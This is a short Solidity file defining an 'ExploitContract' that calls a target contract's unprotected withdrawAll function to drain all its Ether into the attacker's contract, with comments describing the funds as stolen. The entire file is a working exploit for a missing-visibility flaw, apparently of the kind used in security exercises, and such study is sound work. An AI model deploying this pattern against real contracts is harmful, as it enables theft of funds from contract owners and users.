// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract ExploitContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    // Exploit the missing visibility by withdrawing all funds
    function exploit() public {
        // Call the vulnerable withdrawAll function to drain funds
        vulnerableContract.withdrawAll(payable(address(this)));
    }

    // Fallback function to accept stolen Ether
    receive() external payable {}
}
